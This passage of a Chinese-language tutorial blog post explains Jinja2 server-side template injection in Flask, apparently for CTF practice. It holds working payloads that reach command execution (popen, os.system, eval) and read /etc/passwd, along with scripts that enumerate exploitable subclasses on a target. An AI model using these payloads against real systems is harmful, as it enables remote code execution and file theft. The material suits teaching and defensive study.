+<p>我们简单输入一个<code>&#123;&#123;2-1&#125;&#125;</code>，返回了1，说明存在模板注入</p>
+<p><img src="http://yuhaojiang.gitee.io/picture/%E7%BB%86%E8%AF%B4Jinja2%E4%B9%8BSSTI&bypass/image-20201203221521286.png" alt="image-20201203221521286"></p>
+<p>而如果存在SSTI的话，我们就可以利用上面的魔术方法去构造可以读文件或者直接getshell的漏洞</p>
+<p><img src="http://yuhaojiang.gitee.io/picture/%E7%BB%86%E8%AF%B4Jinja2%E4%B9%8BSSTI&bypass/image-20201203222745724.png" alt="image-20201203222745724"></p>
+<p>如何拒绝这种漏洞呢，其实很简单只需要使用固定的模板即可，正确的代码应该如下</p>
+<p><code>ssti2.py</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request,render_template</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">	<span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>,name=request.args.get(<span class="string">&#x27;name&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5000</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
+
+<p><code>index.html</code></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>SSTI<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">h3</span>&gt;</span>Hello, &#123;&#123;name&#125;&#125; !<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到原封不动的输出了<code>&#123;&#123;2-1&#125;&#125;</code></p>
+<p><img src="http://yuhaojiang.gitee.io/picture/%E7%BB%86%E8%AF%B4Jinja2%E4%B9%8BSSTI&bypass/image-20201203221440880.png" alt="image-20201203221440880"></p>
+<h2 id="构造链思路"><a href="#构造链思路" class="headerlink" title="构造链思路"></a>构造链思路</h2><p>这里从零开始介绍如何去构造SSTI漏洞的payload，可以用上面存在SSTI漏洞的<code>ssti.py</code>做实验</p>
+<ul>
+<li>第一步</li>
+</ul>
+<p>目的：使用<code>__class__</code>来获取内置类所对应的类</p>
+<p>可以通过使用<code>str</code>，<code>list</code>，<code>tuple</code>，<code>dict</code>等来获取</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Python <span class="number">3.7</span><span class="number">.8</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">str</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; &quot;&quot;.<span class="title">__class__</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;<span class="title">str</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; [].<span class="title">__class__</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;<span class="title">list</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; ().<span class="title">__class__</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;<span class="title">tuple</span>&#x27;&gt;</span></span><br><span class="line">&gt;&gt;&gt; &#123;&#125;.__class__</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">dict</span>&#x27;&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>第二步</li>
+</ul>
+<p>目的：拿到<code>object</code>基类</p>
+<p>用<code>__bases__[0]</code>拿到基类</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Python <span class="number">3.7</span><span class="number">.8</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">object</span>&#x27;&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>用<code>__base__</code>拿到基类</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Python <span class="number">3.7</span><span class="number">.8</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__base__</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">object</span>&#x27;&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>用<code>__mro__[1]</code>或者<code>__mro__[-1]</code>拿到基类</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Python <span class="number">3.7</span><span class="number">.8</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">1</span>]</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">object</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; &#x27;&#x27;.<span class="title">__class__</span>.<span class="title">__mro__</span>[-1]</span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;<span class="title">object</span>&#x27;&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>第三步</li>
+</ul>
+<p>用<code>__subclasses__()</code>拿到子类列表</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Python <span class="number">3.7</span><span class="number">.8</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()</span><br><span class="line">...一大堆的子类</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>第四步</li>
+</ul>
+<p>在子类列表中找到可以getshell的类</p>
+<h2 id="寻找利用类"><a href="#寻找利用类" class="headerlink" title="寻找利用类"></a>寻找利用类</h2><p>在上述的第四步中，如何快速的寻找利用类呢</p>
+<h3 id="利用脚本跑索引"><a href="#利用脚本跑索引" class="headerlink" title="利用脚本跑索引"></a>利用脚本跑索引</h3><p>我们一般来说是先知晓一些可以getshell的类，然后再去跑这些类的索引，然后这里先讲述如何去跑索引，再详写可以getshell的类</p>
+<p>这里先给出一个在本地遍历的脚本，原理是先遍历所有子类，然后再遍历子类的方法的所引用的东西，来搜索是否调用了我们所需要的方法，这里以<code>popen</code>为例子</p>
+<p><code>find.py</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">search = <span class="string">&#x27;popen&#x27;</span></span><br><span class="line">num = <span class="number">-1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__():</span><br><span class="line">    num += <span class="number">1</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> search <span class="keyword">in</span> i.__init__.__globals__.keys():</span><br><span class="line">            print(i, num)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
+
+<p>我们运行这个脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">λ python3 find.py</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">os</span>.<span class="title">_wrap_close</span>&#x27;&gt; 128</span></span><br></pre></td></tr></table></figure>
+
+<p>可以发现<code>object</code>基类的第128个子类名为<code>os._wrap_close</code>的这个类有popen方法</p>
+<p>先调用它的<code>__init__</code>方法进行初始化类</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Python <span class="number">3.7</span><span class="number">.8</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">128</span>].__init__</span><br><span class="line">&lt;function _wrap_close.__init__ at <span class="number">0x000001FCD0B21E58</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<p>再调用<code>__globals__</code>可以获取到方法内以字典的形式返回的方法、属性等值</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Python <span class="number">3.7</span><span class="number">.8</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">128</span>].__init__.__globals__</span><br><span class="line">&#123;<span class="string">&#x27;__name__&#x27;</span>: <span class="string">&#x27;os&#x27;</span>...中间省略...&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">os</span>.<span class="title">PathLike</span>&#x27;&gt;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后就可以调用其中的popen来执行命令</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Python <span class="number">3.7</span><span class="number">.8</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">128</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;whoami&#x27;</span>).read()</span><br><span class="line"><span class="string">&#x27;desktop-t6u2ptl\\think\n&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>但是上面的方法仅限于在本地寻找，因为在做CTF题目的时候，我们无法在题目环境中运行这个<code>find.py</code>，这里用hhhm师傅的一个脚本直接去寻找子类</p>
+<p>我们首先把所有的子类列举出来</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Python <span class="number">3.7</span><span class="number">.8</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__bases__[<span class="number">0</span>].__subclasses__()</span><br><span class="line">...一大堆的子类</span><br></pre></td></tr></table></figure>
+
+<p>然后把子类列表放进下面脚本中的a中，然后寻找<code>os._wrap_close</code>这个类</p>
+<p><code>find2.py</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">a = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;class &#x27;type&#x27;&gt;,...,&lt;class &#x27;subprocess.Popen&#x27;&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">num = <span class="number">0</span></span><br><span class="line">allList = []</span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="keyword">if</span> i == <span class="string">&quot;&gt;&quot;</span>:</span><br><span class="line">        result += i</span><br><span class="line">        allList.append(result)</span><br><span class="line">        result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;\n&quot;</span> <span class="keyword">or</span> i == <span class="string">&quot;,&quot;</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result += i</span><br><span class="line">        </span><br><span class="line"><span class="keyword">for</span> k,v <span class="keyword">in</span> enumerate(allList):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;os._wrap_close&quot;</span> <span class="keyword">in</span> v:</span><br><span class="line">        print(str(k)+<span class="string">&quot;---&gt;&quot;</span>+v)</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://yuhaojiang.gitee.io/picture/%E7%BB%86%E8%AF%B4Jinja2%E4%B9%8BSSTI&bypass/image-20201125111402856.png" alt="image-20201125111402856"></p>
+<p>又或者用如下的<code>requests</code>脚本去跑</p>
+<p><code>find3.py</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> html</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">300</span>):</span><br><span class="line">    time.sleep(<span class="number">0.06</span>)</span><br><span class="line">    payload=<span class="string">&quot;&#123;&#123;().__class__.__mro__[-1].__subclasses__()[%s]&#125;&#125;&quot;</span> % i</span><br><span class="line">    url=<span class="string">&#x27;http://ip:5000?name=&#x27;</span></span><br><span class="line">    r = requests.post(url+payload)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;catch_warnings&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        print(r.text)</span><br><span class="line">        print(i)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://kawhi.oss-cn-beijing.aliyuncs.com/img/image-20201208002449661.png" alt="image-20201208002449661"></p>
+<p>tips：后面的各种方法都是利用这种思路寻找到可以getshell类的位置</p>
+<h3 id="python3的方法"><a href="#python3的方法" class="headerlink" title="python3的方法"></a>python3的方法</h3><ul>
+<li><code>os._wrap_close</code>类中的<code>popen</code></li>
+</ul>
+<p>在上面的例子中就是用的这个方法，payload如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">128</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>__import__</code>中的<code>os</code></li>
+</ul>
+<p>把上面<code>find.py</code>脚本中的search变量换成<code>__import__</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">λ python3 find.py</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">_frozen_importlib</span>.<span class="title">_ModuleLock</span>&#x27;&gt; 75</span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;<span class="title">_frozen_importlib</span>.<span class="title">_DummyModuleLock</span>&#x27;&gt; 76</span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;<span class="title">_frozen_importlib</span>.<span class="title">_ModuleLockManager</span>&#x27;&gt; 77</span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;<span class="title">_frozen_importlib</span>.<span class="title">_installed_safely</span>&#x27;&gt; 78</span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;<span class="title">_frozen_importlib</span>.<span class="title">ModuleSpec</span>&#x27;&gt; 79</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到有5个类下是包含<code>__import__</code>的，随便用一个即可</p>
+<p>payload如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">75</span>].__init__.__globals__.__import__(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="python2的方法"><a href="#python2的方法" class="headerlink" title="python2的方法"></a>python2的方法</h3><p>因为python3和python2两个版本下有差别，这里把python2单独拿出来说</p>
+<p>tips：python2的<code>string</code>类型不直接从属于属于基类，所以要用两次 <code>__bases__[0]</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Python <span class="number">2.7</span><span class="number">.10</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">&lt;type <span class="string">&#x27;basestring&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].__bases__[<span class="number">0</span>]</span><br><span class="line">&lt;type <span class="string">&#x27;object&#x27;</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>file</code>类读写文件</li>
+</ul>
+<p>本方法只能适用于python2，因为在python3中<code>file</code>类已经被移除了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>]</span><br><span class="line">&lt;type <span class="string">&#x27;file&#x27;</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可以使用dir查看file对象中的内置方法</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>dir(().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>])</span><br><span class="line">[<span class="string">&#x27;__class__&#x27;</span>, <span class="string">&#x27;__delattr__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__enter__&#x27;</span>, <span class="string">&#x27;__exit__&#x27;</span>, <span class="string">&#x27;__format__&#x27;</span>, <span class="string">&#x27;__getattribute__&#x27;</span>, <span class="string">&#x27;__hash__&#x27;</span>, <span class="string">&#x27;__init__&#x27;</span>, <span class="string">&#x27;__iter__&#x27;</span>, <span class="string">&#x27;__new__&#x27;</span>, <span class="string">&#x27;__reduce__&#x27;</span>, <span class="string">&#x27;__reduce_ex__&#x27;</span>, <span class="string">&#x27;__repr__&#x27;</span>, <span class="string">&#x27;__setattr__&#x27;</span>, <span class="string">&#x27;__sizeof__&#x27;</span>, <span class="string">&#x27;__str__&#x27;</span>, <span class="string">&#x27;__subclasshook__&#x27;</span>, <span class="string">&#x27;close&#x27;</span>, <span class="string">&#x27;closed&#x27;</span>, <span class="string">&#x27;encoding&#x27;</span>, <span class="string">&#x27;errors&#x27;</span>, <span class="string">&#x27;fileno&#x27;</span>, <span class="string">&#x27;flush&#x27;</span>, <span class="string">&#x27;isatty&#x27;</span>, <span class="string">&#x27;mode&#x27;</span>, <span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;newlines&#x27;</span>, <span class="string">&#x27;next&#x27;</span>, <span class="string">&#x27;read&#x27;</span>, <span class="string">&#x27;readinto&#x27;</span>, <span class="string">&#x27;readline&#x27;</span>, <span class="string">&#x27;readlines&#x27;</span>, <span class="string">&#x27;seek&#x27;</span>, <span class="string">&#x27;softspace&#x27;</span>, <span class="string">&#x27;tell&#x27;</span>, <span class="string">&#x27;truncate&#x27;</span>, <span class="string">&#x27;write&#x27;</span>, <span class="string">&#x27;writelines&#x27;</span>, <span class="string">&#x27;xreadlines&#x27;</span>]</span><br></pre></td></tr></table></figure>
+
+<p>然后直接调用里面的方法即可，payload如下</p>
+<p>读文件</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).readlines()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>warnings</code>类中的<code>linecache</code></li>
+</ul>
+<p>本方法只能用于python2，因为在python3中会报错<code>&#39;function object&#39; has no attribute &#39;func_globals&#39;</code>，猜测应该是python3中<code>func_globals</code>被移除了还是啥的，如果不对请师傅们指出</p>
+<p>我们把上面的<code>find.py</code>脚本中的search变量赋值为<code>linecache</code>，去寻找含有<code>linecache</code>的类</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">λ python find.py</span><br><span class="line">(&lt;class &#x27;warnings.WarningMessage&#x27;&gt;, 59)</span><br><span class="line">(&lt;class &#x27;warnings.catch_warnings&#x27;&gt;, 60)</span><br></pre></td></tr></table></figure>
+
+<p>后面如法炮制，payload如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[<span class="number">60</span>].__init__.func_globals[<span class="string">&#x27;linecache&#x27;</span>].os.popen(<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="python2-amp-3的方法"><a href="#python2-amp-3的方法" class="headerlink" title="python2&amp;3的方法"></a>python2&amp;3的方法</h3><p>这里介绍python2和python3两个版本通用的方法</p>
+<ul>
+<li><code>__builtins__</code>代码执行</li>
+</ul>
+<p>这种方法是比较常用的，因为他两种python版本都适用</p>
+<p>首先<code>__builtins__</code>是一个包含了大量内置函数的一个模块，我们平时用python的时候之所以可以直接使用一些函数比如<code>abs</code>，<code>max</code>，就是因为<code>__builtins__</code>这类模块在Python启动时为我们导入了，可以使用<code>dir(__builtins__)</code>来查看调用方法的列表，然后可以发现<code>__builtins__</code>下有<code>eval</code>，<code>__import__</code>等的函数，因此可以利用此来执行命令。</p>
+<p>把上面<code>find.py</code>脚本search变量赋值为<code>__builtins__</code>，然后找到第140个类<code>warnings.catch_warnings</code>含有他，而且这里的话比较多的类都含有<code>__builtins__</code>，比如常用的还有<code>email.header._ValueFormatter</code>等等，这也可能是为什么这种方法比较多人用的原因之一吧</p>
+<p>再调用<code>eval</code>等函数和方法即可，payload如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">140</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">140</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">140</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">140</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;open&#x27;</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>又或者用如下两种方式，用模板来跑循环</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> ().__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].eval(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">&#x27;catch_warnings&#x27;</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;whoami&quot;).read()&#x27;</span>) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://yuhaojiang.gitee.io/picture/%E7%BB%86%E8%AF%B4Jinja2%E4%B9%8BSSTI&bypass/image-20201125103337085.png" alt="image-20201125103337085"></p>
+<p>读取文件payload</p>
